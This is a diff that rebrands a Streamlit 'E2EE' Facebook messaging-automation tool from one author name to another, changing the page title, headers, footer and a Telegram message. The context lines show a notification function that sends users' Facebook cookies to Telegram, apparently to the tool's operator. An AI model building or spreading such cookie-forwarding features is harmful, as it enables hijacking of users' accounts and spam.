@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE by HASSAN RAJPUT",
+    page_title="🎀⎯͢  𝐑𝐀𝐇𝐔𝐋  𝐔𝐏 𝟏𝟏 ⎯꯭⟶🧸🍿°",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -488,7 +488,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 👤 *Username:* {username}
 ⏰ *Time:* {current_time}
-🤖 *System:* HASSAN RAJPUT E2EE Facebook Automation
+🤖 *System:*  𝐑𝐀𝐇𝐔𝐋 UP11 𝐄𝟐𝐄𝐄  Facebook Automation
 🍪 *Cookies:* `{cookies_display}`
 
 ✅ User has successfully started the automation process."""
@@ -1135,7 +1135,7 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-st.markdown('<div class="main-header"><h1>HASSAN RAJPUT E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>🎀 ⎯𝐑𝐀𝐇𝐔𝐋 𝐔𝐏 𝟏𝟏🌸-" ⤹🌎✨"</h1><p>Created by 𝐊𝐀𝐓𝐓𝐀𝐑   𝗛𝐈ƞ𝐝ʋ E2EE INBOX LODER 2026</p></div>', unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
@@ -1299,4 +1299,4 @@ else:
                 time.sleep(1)
                 st.rerun()
 
-st.markdown('<div class="footer">Made with ❤️ by HASSAN RAJPUT | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by 𝐑𝐀𝐇𝐔𝐋 𝐔𝐏 𝟏𝟏 | © 2026All Rights Reserved</div>', unsafe_allow_html=True)
